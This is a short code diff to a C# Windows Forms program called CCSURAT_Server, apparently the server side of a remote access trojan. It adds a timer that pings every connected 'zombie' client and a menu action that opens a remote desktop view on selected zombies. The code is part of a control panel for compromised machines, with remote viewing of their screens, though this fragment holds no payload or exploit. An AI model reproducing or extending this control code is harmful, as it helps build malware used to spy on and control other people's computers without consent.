@@ -30,6 +30,9 @@ namespace CCSURAT_Server
         {
             // start the connection listener on port, pass current zombies list
             ListenOnPort(listenPort);
+
+            // start ping timer that pings clients every x seconds.
+            pingTimer.Start();
             this.Text = "CCSURAT-Server v" + Application.ProductVersion;
 
             zombieListView.ControlRemoved += new System.Windows.Forms.ControlEventHandler(this.zombieListView_ControlRemoved);
@@ -225,6 +228,28 @@ namespace CCSURAT_Server
                 foreach (ListViewItem item in zombieListView.Items)
                     item.Selected = true;
             }
+        }
+
+        private void pingTimer_Tick(object sender, EventArgs e)
+        {
+            // Refresh all connected client's pings
+            foreach(Zombie z in zombies)
+            {
+                z.UpdatePing();
+            }
+        }
+
+        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (selected.Item != null)
+                foreach (ZombieListItem zItem in zombieListView.SelectedItems)
+                {
+                    if (zItem.ForeColor != Color.Gray)
+                    {
+                        RemoteDesktop remoteDesktop = new RemoteDesktop(zItem.zombieClient);
+                        remoteDesktop.Show();
+                    }
+                }
         }
     }
 
